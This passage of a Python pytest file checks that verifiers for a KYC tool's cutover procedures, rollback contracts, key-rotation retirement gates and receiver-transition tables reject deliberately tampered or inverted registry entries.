                playbook.RollbackFact(playbook.VERIFICATION, playbook.VERIFY_NOT_STATED),
                playbook.RollbackFact(playbook.ENDING, playbook.ENDING_RESUMED, "d"),
            ))
    aggregate = tuple(
        playbook.RollbackFact(playbook.SCHEMA, playbook.BR_SCHEMA_HELD, "b")
        if f.question == playbook.SCHEMA else f
        for f in _pr7b().rollback_contract.facts
    )
    with pytest.raises(ValueError, match="aggregate schema answer cannot be a branch result"):
        playbook.RollbackContract(aggregate)


def test_a_swapped_outcome_cannot_claim_the_other_result():
    with pytest.raises(ValueError, match="SUCCEEDED downgrade cannot claim the schema held"):
        playbook.RollbackBranch(
            outcome=playbook.OUTCOME_SUCCEEDED,
            facts=(
                playbook.RollbackFact(playbook.SCHEMA, playbook.BR_SCHEMA_HELD, "a"),
                playbook.RollbackFact(playbook.IMAGE, playbook.IMAGE_PRIOR, "b"),
                playbook.RollbackFact(playbook.RESTORES, playbook.RESTORES_NO, "c"),
                playbook.RollbackFact(playbook.VERIFICATION, playbook.VERIFY_NOT_STATED),
                playbook.RollbackFact(playbook.ENDING, playbook.ENDING_RESUMED, "d"),
            ))


# ── Wave 1 / F4a: the plan's executable bindings and unconstructable inversions ────────────────
def test_plan_role_vocabulary_equals_the_process_role_enum():
    """`PLAN_ROLES` mirrors `ProcessRole` so plan.py stays import-pure; this bind is what stops
    the mirror drifting — a role added to the enum forces a decision in the plan vocabulary."""
    from docs.contracts.plan import PLAN_ROLES

    assert set(PLAN_ROLES) == {role.value for role in ProcessRole}


def test_the_activation_flag_binds_to_the_real_settings_field():
    """The typed flag slot names KYC_ENFORCE_BUNDLE_PINNING; the Settings field must exist under
    that env name and default to False — 'the flag is still OFF' is the shipped default, not a
    hope."""
    from docs.contracts.plan import FlagStillOff

    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    flag = next(p for p in pr6.plan.prerequisites if isinstance(p, FlagStillOff))
    field_name = flag.flag_env.removeprefix("KYC_").lower()
    assert field_name in Settings.model_fields, flag.flag_env
    assert Settings.model_fields[field_name].default is False


def test_plan_preflight_and_diagnostic_bind_to_the_ref_commands():
    """The preflight/diagnostic prerequisites are only honest if the section actually publishes
    the command an operator would run — bound through the ref's typed command records."""
    procedures = {p.name: p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")}
    pr6_argvs = {c.argv for c in procedures["Bundle-pinning activation"].playbook_ref.commands}
    assert ("python", "-m", "kyc_tool.ops.verify_pinnable_backlog") in pr6_argvs
    pr7b_argvs = {c.argv for c in procedures["Migrations 013-023"].playbook_ref.commands}
    assert ("python", "-m", "kyc_tool.ops.verify_pr7b_core_backfill") in pr7b_argvs


def test_the_schema_maintenance_when_binds_to_024_pending():
    """The derived template says '024 is pending'; the wire claim is the authority for that."""
    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    assert "024 is pending" in pr7b.when
    assert WIRE["WIRE.ORDERING.BOOTSTRAP_024"].state is ClaimState.PENDING


def test_plan_evidence_quotes_sit_in_the_digest_bound_section():
    for procedure in OPERATIONS.value("OPS.CUTOVER.PROCEDURES"):
        prose = _playbook_prose(procedure.playbook_ref)
        for prerequisite in procedure.plan.prerequisites:
            assert prerequisite.evidence.lower() in prose, (
                f"{procedure.name}: {type(prerequisite).__name__} quotes "
                f"{prerequisite.evidence!r}, which is not in the reviewed section"
            )


def test_the_four_bundle_inversions_are_unconstructable():
    """Codex's F4a reproduction, kind by kind. Each inversion previously left every verifier
    green; now none of them can be expressed."""
    from docs.contracts import plan as plan_module

    pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
               if p.name == "Bundle-pinning activation")
    good = pr6.plan.prerequisites

    # 1. "start with the flag on": the kind has no state parameter to invert
    with pytest.raises(TypeError):
        plan_module.FlagStillOff(flag_env="KYC_ENFORCE_BUNDLE_PINNING", evidence="x", state="on")

    # 2. skip the seed/read-back
    with pytest.raises(ValueError, match="requires exactly"):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_FLAG_ACTIVATION, subject_id=plan_module.SUBJECT_BUNDLE_PINNING,
            prerequisites=tuple(p for p in good
                                if not isinstance(p, plan_module.SeedAndReadBack)))

    # 3. ignore the backlog preflight
    with pytest.raises(ValueError, match="requires exactly"):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_FLAG_ACTIVATION, subject_id=plan_module.SUBJECT_BUNDLE_PINNING,
            prerequisites=tuple(p for p in good
                                if not isinstance(p, plan_module.BacklogPreflight)))

    # 4. keep the old workers rolling — either drop the stop entirely, or shrink it below floor
    with pytest.raises(ValueError, match="requires exactly"):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_FLAG_ACTIVATION, subject_id=plan_module.SUBJECT_BUNDLE_PINNING,
            prerequisites=tuple(p for p in good
                                if not isinstance(p, plan_module.StoppedAttestedZero)))
    with pytest.raises(ValueError, match="stop-set to include"):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_FLAG_ACTIVATION, subject_id=plan_module.SUBJECT_BUNDLE_PINNING,
            prerequisites=tuple(
                plan_module.StoppedAttestedZero(roles=("retention",), evidence="x")
                if isinstance(p, plan_module.StoppedAttestedZero) else p for p in good))


def test_reordering_retention_after_the_diagnostic_is_unconstructable():
    """The one ordered-prerequisite defect the old keyword tests DID check, now structural: the
    phase owns the canonical order, so a reordered tuple refuses."""
    from docs.contracts import plan as plan_module

    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    reordered = (pr7b.plan.prerequisites[1], pr7b.plan.prerequisites[0],
                 *pr7b.plan.prerequisites[2:])
    with pytest.raises(ValueError, match="requires exactly"):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_SCHEMA_MAINTENANCE, subject_id=pr7b.plan.subject_id,
            prerequisites=reordered)


def test_a_subject_cannot_smuggle_an_obligation():
    """Strengthened by the gate fold (finding 5): the constructor no longer takes text at all —
    the smuggle is a TypeError — and the closed map's validator refuses the sentence shape the
    original F4a specimen used."""
    from docs.contracts import plan as plan_module

    pr5b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "PR 5b full maintenance window")
    with pytest.raises(TypeError):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_SECURITY_FULL_WINDOW,
            subject="The PR 5b release. You may skip the window if pressed for time",
            prerequisites=pr5b.plan.prerequisites)
    assert plan_module.subject_problems(
        "The PR 5b release. You may skip the window if pressed for time")


def test_phase_and_migration_span_cannot_disagree():
    """A security window's own rationale is 'no migration'; a schema maintenance IS its
    migrations. Cross-assembly refuses both ways."""
    import dataclasses

    from docs.contracts.playbook import MigrationSpan

    pr5b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "PR 5b full maintenance window")
    with pytest.raises(ValueError, match="claims to carry no migration"):
        dataclasses.replace(pr5b, name="Migrations 013-023",
                            migration_span=MigrationSpan("012", "023"))
    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    with pytest.raises(ValueError, match="without a migration span"):
        dataclasses.replace(pr7b, migration_span=None)


# ── F3-now / F11-now: the fail-closed gates, proven to bite ───────────────────────────────────────
#
# Audit `4c3015a..cccd5f7` findings 3 and 11, folded under the human decision recorded in PLAN-v2:
# "fail closed now, capability to ROADMAP". Neither missing evidence capability is built this
# round. Instead the published claims stop presenting the capabilities as available — rotation
# retirement is BLOCKED behind gates that refuse every evidence object constructible today, and
# O1-O4 are UNRESOLVABLE until a versioned signed answer-artifact schema exists. Each test below
# is the audit's literal reproduction (or its fail-closed inversion), written red first.

def _this_module():
    """The mutation tests patch this module's own WIRE global, which is the binding the assembled
    verifiers read — so `AUTHORITY_VERIFIERS[...]()` runs the real verifier against the mutation."""
    import sys

    return sys.modules[__name__]


def _wire_with(claim_id: str, **changes):
    """The live WIRE registry with ONE claim's fields replaced — for running the REAL assembled
    verifier against a mutated registry, per the audit's requirement that mutations target the
    top-level verifier rather than an isolated helper."""
    claims = tuple(
        dataclasses.replace(c, **changes) if c.id == claim_id else c for c in WIRE.claims
    )
    return dataclasses.replace(WIRE, claims=claims)


def test_f11_codex_specimens_are_refused_by_the_screens():
    """Finding 11's reproduced specimens: each returned [] from the live acceptors. They are
    sanity SCREENS, not negotiated values — the negotiated maxima and closed vocabularies arrive
    with the versioned answer artifact, which is exactly why resolution stays impossible below."""
    assert wire_module._accept_deadline({"clock": "platform db", "ttl_seconds": 10**12}), (
        "a trillion-second deadline still screens as usable"
    )
    assert wire_module._accept_terminal_authority(
        {"terminal_authority": "platform", "reaper_cadence_seconds": 10**12,
         "outcome_recovery": "signed redelivery with replay on restart"}
    ), "a trillion-second reaper cadence still screens as usable"
    assert wire_module._accept_terminal_authority(
        {"terminal_authority": "platform", "reaper_cadence_seconds": 60,
         "outcome_recovery": "x"}
    ), "a one-character recovery contract still screens as usable"
    assert wire_module._accept_release_id({"scope": "global", "allocated_by": "somebody"}), (
        "an allocator no party to this contract can be bound to still screens as usable"
    )


def test_f11_the_previously_acceptable_o4_answer_is_now_refused():
    """Finding 11's O4 reproduction verbatim: a writer matrix containing only the pipeline, API,
    and outbox writers — with no stance on dev_worker or retention — read as complete. Every
    process role we run must be accounted writer-or-not; an unaccounted role is where an unfenced
    writer hides. The role inventory is OURS (ProcessRole), not the platform's to negotiate."""
    from docs.contracts.wire import REQUIRED_WRITER_ROLES

    old_complete_looking = {
        "writer_roles": tuple(REQUIRED_WRITER_ROLES), "old_image_full_stop": True}
    assert wire_module._accept_writer_matrix(old_complete_looking), (
        "a matrix with no per-process accounting still screens as complete"
    )
    unaccounted = dict(old_complete_looking)
    unaccounted["process_roles"] = {
        "api": "writer", "pipeline_worker": "writer", "outbox_worker": "writer"}
    problems = wire_module._accept_writer_matrix(unaccounted)
    assert any("dev_worker" in p and "retention" in p for p in problems), (
        f"dev_worker/retention were left unaccounted without refusal: {problems}"
    )
    # guard the guard: the screen reads the stances, not just the key set
    demoted = dict(old_complete_looking)
    demoted["process_roles"] = {
        "api": "non-writer", "pipeline_worker": "writer", "outbox_worker": "writer",
        "retention": "non-writer", "dev_worker": "writer"}
    assert any("canonical capability map" in p
               for p in wire_module._accept_writer_matrix(demoted)), (
        "a writer host demoted to non-writer was not refused against the canonical map"
    )
    unknown = dict(old_complete_looking)
    unknown["process_roles"] = {
        "api": "writer", "pipeline_worker": "writer", "outbox_worker": "writer",
        "retention": "non-writer", "dev_worker": "writer", "shadow_worker": "non-writer"}
    assert any("do not run" in p for p in wire_module._accept_writer_matrix(unknown)), (
        "a process role we do not run was accepted into the accounting"
    )


def test_f11_a_syntactically_perfect_answer_still_cannot_resolve():
    """The fail-closed core: take the best answer each screen accepts, wrap it in the most
    complete artifact shape imaginable — versioned, approved, signature marked verified — and
    resolution must still refuse, on the ABSENCE of the schema/authority, not on content."""
    for item in WIRE.value("WIRE.ORDERING.PENDING_INPUTS"):
        artifact = {
            "schema_version": "1.0.0",
            "approved_by": "platform release authority",
            "signature_verified": True,
            "answer": {"perfect": "content"},
        }
        problems = wire_module.resolution_problems(item, artifact)
        assert problems, f"{item.obligation}: a bare dict resolved an obligation"
        assert any("unresolvable" in p for p in problems), problems
        assert any("schema" in p for p in problems), problems
    assert wire_module.ANSWER_ARTIFACT_SCHEMA is None


def test_f11_the_resolution_gate_reads_its_anchor_not_a_constant_refusal():
    """Guard the guard: flip the absence anchor and the refusal must CHANGE BRANCH — to the
    tripwire demanding the gate be rewritten with the schema — proving the gate consults the
    anchor rather than returning a hardcoded no."""
    item = WIRE.value("WIRE.ORDERING.PENDING_INPUTS")[0]
    with mock.patch.object(wire_module, "ANSWER_ARTIFACT_AUTHORITY", object()):
        problems = wire_module.resolution_problems(item, {"schema_version": "1.0.0"})
        assert problems, "flipping the slot must not silently resolve anything"
        assert any("rewrite resolution_problems" in p for p in problems), problems
        assert not any("unresolvable" in p for p in problems), (
            "the absence branch fired with a registered authority; the gate is not reading "
            "the slot"
        )


def test_f3_the_rotation_claim_no_longer_presents_retirement_as_available():
    """Finding 3: inbound phase 4 claimed a proof no capability can produce, and outbound cited a
    cutover record whose subject is the outbox attempt ceiling. Both retirement steps must now be
    marked BLOCKED in the procedure text itself, where a reader would otherwise act."""
    lines = WIRE.value("WIRE.SIGN.ROTATION")
    # gate finding 13: the lines are the DERIVATION of the closed step records — an appended
    # override instruction has no syntax, and retirement semantics outside the derived lines
    # are refused by name
    assert tuple(lines) == wire_module.rotation_lines(), (
        "the published rotation lines diverge from the closed-step derivation"
    )
    assert wire_module.rotation_prose_problems(lines) == []
    inbound = next(line for line in lines if line.startswith("INBOUND"))
    outbound = next(line for line in lines if line.startswith("OUTBOUND"))
    assert "BLOCKED" in inbound, "the inbound proof step reads as available"
    assert "BLOCKED" in outbound, "the outbound retire step reads as available"


def test_f3_no_constructible_evidence_authorizes_retirement():
    """Every named specimen — including the perfectly SHAPED witness/receipt/record claims that
    nothing shipped can back — must be refused with reasons that name the missing capability."""
    gates = {g.direction: g for g in WIRE.value("WIRE.SIGN.ROTATION_RETIREMENT")}
    assert set(gates) == {"INBOUND", "OUTBOUND"}
    for gate in gates.values():
        assert gate.refuse("not a mapping"), f"{gate.direction}: non-mapping evidence accepted"
        for label, evidence in gate.must_reject:
            reasons = gate.refuse(evidence)
            assert reasons, f"{gate.direction}: {label} was accepted"
    shaped_witness = {
        "kind": "durable_per_key_fleet_witness",
        "authority": "kyc_tool.api.hmac_witness.inbound_zero_for_key",
        "window_days": 30, "zero_confirmed": True}
    reasons = gates["INBOUND"].refuse(shaped_witness)
    assert any("has no inbound_zero_for_key" in r for r in reasons), reasons
    shaped_receipt = {
        "kind": "signed_fleet_receipt", "signed_by": "signer-fleet operator",
        "signature_verified": True, "observation_days": 7}
    reasons = gates["INBOUND"].refuse(shaped_receipt)
    assert any("no signed fleet-receipt schema or verifying authority exists" in r
               for r in reasons), reasons
    shaped_record = {
        "kind": "hmac_signer_cutover_record", "target_key_id": "new",
        "secret_digest": "0" * 64, "roles": ("outbox_worker", "dev_worker"),
        "attested_zero": True}
    reasons = gates["OUTBOUND"].refuse(shaped_record)
    assert any("no record names a target key id" in r for r in reasons), reasons


def test_f3_the_gates_read_their_absence_anchors():
    """Guard the guard, restated on the typed slot (gate finding 13 moved the gates from
    name-probing to slot dispatch): a fake presence in the SLOT moves every refusal to the
    rewrite-me tripwire — never to acceptance — and the module-name anchors keep their own
    bite inside the assembled claim verifier (a fake per-key witness fails it outright)."""
    from kyc_tool.api import hmac_witness

    gates = {g.direction: g for g in WIRE.value("WIRE.SIGN.ROTATION_RETIREMENT")}
    with mock.patch.object(wire_module, "RETIREMENT_AUTHORITY", object()):
        for direction, evidence in (
            ("INBOUND", {"kind": "durable_per_key_fleet_witness"}),
            ("INBOUND", {"kind": "signed_fleet_receipt"}),
            ("OUTBOUND", {"kind": "hmac_signer_cutover_record"}),
        ):
            reasons = gates[direction].refuse(evidence)
            assert reasons and any("rewrite _refuse" in r for r in reasons), reasons
    with mock.patch.object(
        hmac_witness, "inbound_zero_for_key", lambda *a, **k: True, create=True
    ), pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION_RETIREMENT"]()


def test_f3_wait_only_phase_mutation_fails_the_assembled_verifier(monkeypatch):
    """Finding 3's literal reproduction: replace inbound phase 4 with 'wait one second whether or
    not old-key requests still arrive' and AUTHORITY_VERIFIERS['WIRE.SIGN.ROTATION']() passed.
    The gate's transition clause is now bound verbatim into the direction line, so the wait-only
    rewrite breaks the assembled verifier itself."""
    lines = list(WIRE.value("WIRE.SIGN.ROTATION"))
    i = next(idx for idx, s in enumerate(lines) if s.startswith("INBOUND"))
    mutated_line = re.sub(
        r"\(4\).*?\(5\)",
        "(4) We wait one second whether or not old-key requests still arrive. (5)",
        lines[i],
    )
    assert mutated_line != lines[i], "the mutation failed to change the line"
    lines[i] = mutated_line
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.SIGN.ROTATION", value=tuple(lines)))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION"]()


def test_f3_stripping_the_blocked_marker_fails_the_assembled_verifier(monkeypatch):
    """Keeping the proof sentence while deleting only the BLOCKED marker restores the original
    overclaim — the procedure reads as executable again — and must fail the same verifier."""
    lines = list(WIRE.value("WIRE.SIGN.ROTATION"))
    i = next(idx for idx, s in enumerate(lines) if s.startswith("INBOUND"))
    mutated_line = re.sub(r" — the step that is BLOCKED[^.]*", "", lines[i])
    assert mutated_line != lines[i], "the mutation failed to change the line"
    lines[i] = mutated_line
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.SIGN.ROTATION", value=tuple(lines)))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION"]()


def test_f3_demoting_the_retirement_claim_to_shipped_fails_its_verifier(monkeypatch):
    """BLOCKED is the published state the whole fold hangs on; a quiet promotion to SHIPPED must
    fail the claim's own assembled verifier."""
    monkeypatch.setattr(
        _this_module(), "WIRE",
        _wire_with("WIRE.SIGN.ROTATION_RETIREMENT", state=ClaimState.SHIPPED))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.SIGN.ROTATION_RETIREMENT"]()


# ── Wave 1 closure: representative F7/F8/F9 tampers through the ASSEMBLED verifier ────────────────
#
# PLAN-REVIEW point 4: "the exact F7/F8/F9/F4a mutations must target the assembled top-level
# verifier, not isolated helper tests." The byte-level matrices above run through the same
# helpers the verifier itself executes, and the F4a/F8 inversions are unconstructable outright.
# What none of them showed is the assembled verifier REFUSING a tampered procedure OBJECT — the
# object.__setattr__ route around frozen dataclasses that its docstring claims cannot survive.
# These three run the real AUTHORITY_VERIFIERS['OPS.CUTOVER.PROCEDURES'] against a mutated
# OPERATIONS registry and prove the claim.


def _operations_with_procedure(tampered) -> object:
    """The live OPERATIONS registry with the procedure of the same name swapped for `tampered`."""
    value = tuple(
        tampered if p.name == tampered.name else p
        for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
    )
    claims = tuple(
        dataclasses.replace(c, value=value) if c.id == "OPS.CUTOVER.PROCEDURES" else c
        for c in OPERATIONS.claims
    )
    return dataclasses.replace(OPERATIONS, claims=claims)


def test_f8_an_understated_range_under_the_unchanged_name_fails_the_assembled_verifier(monkeypatch):
    """The audit's F8 reproduction verbatim: keep the visible name 'Migrations 013-023', shrink
    the range to start at 018, and the complete authority verifier passed. Now the verifier
    recomputes the walk from the span and requires exact ordered equality, so even forcing the
    derived field through object.__setattr__ cannot survive."""
    import copy

    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    tampered = copy.copy(pr7b)
    object.__setattr__(tampered, "migration_range", pr7b.migration_range[5:])
    assert tampered.name == "Migrations 013-023", "the visible name must stay unchanged"
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f7_a_repinned_digest_nobody_reviewed_fails_the_assembled_verifier(monkeypatch):
    """A re-pin is only the act of review if it matches the real bytes: pin an arbitrary digest
    on the ref and the verifier's own read of the live section refuses it."""
    import copy

    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    tampered = copy.copy(pr7b)
    object.__setattr__(
        tampered, "playbook_ref", dataclasses.replace(pr7b.playbook_ref, sha256="0" * 64))
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f9_an_omitted_branch_fails_the_assembled_verifier(monkeypatch):
    """Drop the REFUSED branch and keep only SUCCEEDED: the published rollback prose no longer
    derives from the contract, and the migrations still make refusal reachable — the assembled
    verifier refuses on the first of those it reaches (the derived-prose bind), with the
    reachable-outcome coverage behind it for a tamper that also regenerates the prose."""
    import copy

    pr7b = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Migrations 013-023")
    succeeded_only = tuple(
        b for b in pr7b.rollback_contract.branches if b.outcome == playbook.OUTCOME_SUCCEEDED)
    assert len(succeeded_only) == 1, "the baseline contract no longer has the expected branches"
    tampered_contract = copy.copy(pr7b.rollback_contract)
    object.__setattr__(tampered_contract, "branches", succeeded_only)
    tampered = copy.copy(pr7b)
    object.__setattr__(tampered, "rollback_contract", tampered_contract)
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


# ── Wave-1 gate F2 + F3: outcomes against an independent oracle; conditions parse back ────────────
#
# Gate audit `6c4f54a..91fbde3` findings 2 and 3. `decide()` read its outcome off the same row the
# verifier compared it to, so a coordinated boolean flip INSTALLED in the real table stayed green;
# and the derived condition prose could have its facet phrases swapped (or read ambiguously) while
# the hidden predicates stayed correct. The verifier now holds every row and the executed decision
# against an oracle derived from the accepted invariants, and parses the RENDERED condition text
# back into a predicate.


def _installed_effectiveness_mutation(monkeypatch, row_index: int, **flips):
    """Install a boolean-flipped copy of one post-024 row into BOTH consumers: the published
    registry object and the reference implementation's imported table."""
    import copy

    from docs.contracts import receiver_reference as rr
    from docs.contracts import wire as w

    rows = list(wire_module.RECEIVER_TRANSITIONS)
    target = [i for i, t in enumerate(rows) if t.phase == w.POST_024][row_index]
    mutated_row = copy.copy(rows[target])
    for field_name, flipped in flips.items():
        object.__setattr__(mutated_row, field_name, flipped)
    rows[target] = mutated_row
    mutated = tuple(rows)
    monkeypatch.setattr(w, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(rr, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(
        _this_module(), "WIRE",
        _wire_with("WIRE.CALLBACK.EFFECTIVENESS", value=mutated))


def test_f2_every_installed_outcome_flip_fails_the_assembled_verifier(monkeypatch):
    """The audit's reproduction: flip `becomes_effective` on the interim fresh/no-current row (and
    every other boolean on every post-024 row), install it in the real table, and the top-level
    verifier stayed green. Now every flip must fail against the invariant oracle."""
    from docs.contracts import wire as w

    post_rows = [t for t in wire_module.RECEIVER_TRANSITIONS if t.phase == w.POST_024]
    for index in range(len(post_rows)):
        for field, current in (
            ("records", post_rows[index].records),
            ("becomes_effective", post_rows[index].becomes_effective),
            ("advances_high_water", post_rows[index].advances_high_water),
        ):
            _installed_effectiveness_mutation(monkeypatch, index, **{field: not current})
            with pytest.raises(AssertionError):
                AUTHORITY_VERIFIERS["WIRE.CALLBACK.EFFECTIVENESS"]()
            monkeypatch.undo()


def test_f2_the_interim_fresh_no_current_flip_specifically(monkeypatch):
    """The named specimen, kept explicit: interim fresh/no-current becomes effective=False."""
    from docs.contracts import receiver_reference as rr
    from docs.contracts import wire as w

    rows = list(wire_module.RECEIVER_TRANSITIONS)
    target = next(
        i for i, t in enumerate(rows)
        if t.phase == w.INTERIM and t.becomes_effective
    )
    import copy

    tampered_row = copy.copy(rows[target])
    object.__setattr__(tampered_row, "becomes_effective", False)
    rows[target] = tampered_row
    mutated = tuple(rows)
    monkeypatch.setattr(w, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(rr, "RECEIVER_TRANSITIONS", mutated)
    monkeypatch.setattr(
        _this_module(), "WIRE", _wire_with("WIRE.CALLBACK.EFFECTIVENESS", value=mutated))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.CALLBACK.EFFECTIVENESS"]()


def test_f3_swapping_facet_phrases_fails_the_assembled_verifier(monkeypatch):
    """The audit's reproduction: swap the manual and automatic meanings in the token legend and
    derive conditions normally — the PDF then tells TechCraft the opposite predicate. The rendered
    text must parse back to the row's own predicate, and the legend's meanings are cross-bound to
    their tokens."""
    from docs.contracts import predicates

    legend = dict(predicates.FACET_LEGEND)
    legend[predicates.SRC_MANUAL], legend[predicates.SRC_AUTOMATIC] = (
        legend[predicates.SRC_AUTOMATIC], legend[predicates.SRC_MANUAL])
    monkeypatch.setattr(predicates, "FACET_LEGEND", legend)
    monkeypatch.setattr(
        _this_module(), "WIRE",
        _wire_with("WIRE.CALLBACK.LEGEND", value=tuple(sorted(legend.items()))))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["WIRE.CALLBACK.LEGEND"]()


def test_f3_rendered_conditions_parse_back_to_their_own_predicates():
    """Ambiguity is the other half: `fresh AND no sequence, or at-or-below` reads as a
    disjunction of conjunctions. The canonical grouped form must round-trip: parse(render(when))
    == when, for every published row, in both machines."""
    from docs.contracts import predicates

    for row in wire_module.RECEIVER_TRANSITIONS:
        parsed = predicates.parse_condition(row.condition)
        assert parsed == row.when, (
            f"{row.phase}: {row.condition!r} does not parse back to its own predicate"
        )


def test_f3_a_multivalue_facet_renders_as_one_braced_group():
    """Grouping is load-bearing: the old flat 'a, or b, AND c' shape reads as a disjunction of
    conjunctions, so a multi-valued facet must render inside ONE braced group with the facet
    named, leaving no precedence for a reader to guess."""
    from docs.contracts import predicates

    when = predicates.When(
        duplicate=frozenset({predicates.FRESH}),
        source=frozenset({predicates.SRC_NONE, predicates.SRC_AUTOMATIC}),
        sequence=frozenset({predicates.SEQ_ABOVE}),
    )
    assert when.condition() == (
        "duplicate = fresh AND source in {none, automatic} AND sequence = above"
    )


# ── Wave-1 gate F5-F8: closed procedure profiles and exact inventories, red first ─────────────────
#
# Gate audit `6c4f54a..91fbde3` findings 5-8. The typed procedure unit was closed only over the
# fields it chose to model: derived prose could be overwritten after construction, the one
# authored subject slot could carry an operational instruction, rollback answers and platform
# commitments were selectable subsets, branch markers could alias, and the playbook's command
# inventory was checked as a subset with the heading outside the digest.


def _pr(name: str):
    return next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES") if p.name == name)


def test_f5_tampered_derivations_fail_the_assembled_verifier(monkeypatch):
    """The audit's reproduction: overwrite PR 6's derived `when` and `blocks_start` with the
    inverted instructions and the assembled verifier passed, because it checked only
    nonblank/nonempty. The verifier now REBINDS both to the plan's own derivations every run."""
    import copy

    pr6 = _pr("Bundle-pinning activation")
    tampered = copy.copy(pr6)
    object.__setattr__(
        tampered, "when", "start flag-on workers while the old pool is rolling")
    object.__setattr__(
        tampered, "blocks_start",
        ("skip the seed and read-back", "ignore the unpinnable backlog",
         "keep the old workers rolling"))
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f5_the_subject_is_a_closed_id_not_free_text():
    """The audit's second route: a normally constructed subject reading 'Turning on
    policy-bundle pinning: start workers with the flag ON' was printed at the front of the
    authoritative plan. The constructor no longer takes text at all — subjects are closed ids
    resolved through a validated map — and the validator refuses every operational shape."""
    from docs.contracts import plan as plan_module

    pr6 = _pr("Bundle-pinning activation")
    with pytest.raises(TypeError):
        plan_module.ProcedurePlanContract(
            phase=plan_module.PHASE_FLAG_ACTIVATION,
            subject="Turning on policy-bundle pinning: start workers with the flag ON",
            prerequisites=pr6.plan.prerequisites)
    for operational in (
        "Turning on policy-bundle pinning: start workers with the flag ON",
        "Turning on policy-bundle pinning\nstart workers with the flag ON",
        "Should we start the flag-on workers now?",
        "Start the flag-on workers now.",
        "Start the flag-on workers now!",
    ):
        assert plan_module.subject_problems(operational), (
            f"an operational subject was accepted: {operational!r}"
        )
    for sid, text in plan_module.PROCEDURE_SUBJECTS.items():
        assert plan_module.subject_problems(text) == [], f"{sid}: shipped subject refused"


def test_f6_the_prior_image_substitution_fails_the_assembled_verifier(monkeypatch):
    """The audit's reproduction verbatim: PR 6's image answer flipped from same-release to
    IMAGE_PRIOR with evidence 'the' — a coordinated tamper regenerating the derived prose — and
    the assembled verifier passed. The closed per-procedure profile now owns the exact answer to
    every rollback question."""
    import copy

    pr6 = _pr("Bundle-pinning activation")
    facts = tuple(
        dataclasses.replace(f, answer=playbook.IMAGE_PRIOR, evidence="the")
        if f.question == playbook.IMAGE else f
        for f in pr6.rollback_contract.facts
    )
    tampered_contract = playbook.RollbackContract(facts)
    statements = tampered_contract.statements()
    tampered = copy.copy(pr6)
    object.__setattr__(tampered, "rollback_contract", tampered_contract)
    object.__setattr__(tampered, "irreversible", statements[0])
    object.__setattr__(tampered, "rollback", tuple(statements[1:]))
    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
    with pytest.raises(AssertionError):
        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()


def test_f6_omitting_a_platform_commitment_fails_the_assembled_verifier(monkeypatch):
    """The other reproduction: PR 5b's written-commitment set shrunk to pause-and-buffer alone,
    dropping the fresh-signature retry commitment that the stale-signature cutover failure
    exists to prevent. The profile owns the exact commitment set."""
    import copy

    from docs.contracts import plan as plan_module

    pr5b = _pr("PR 5b full maintenance window")
    prerequisites = tuple(
        dataclasses.replace(p, commitments=(plan_module.COMMIT_PAUSE_BUFFER,))
        if isinstance(p, plan_module.PlatformWrittenCommitment) else p
        for p in pr5b.plan.prerequisites
    )
    weakened_plan = dataclasses.replace(pr5b.plan, prerequisites=prerequisites)
    tampered = copy.copy(pr5b)
    object.__setattr__(tampered, "plan", weakened_plan)
    object.__setattr__(tampered, "when", weakened_plan.when())
    object.__setattr__(tampered, "blocks_start", weakened_plan.blocks_start())
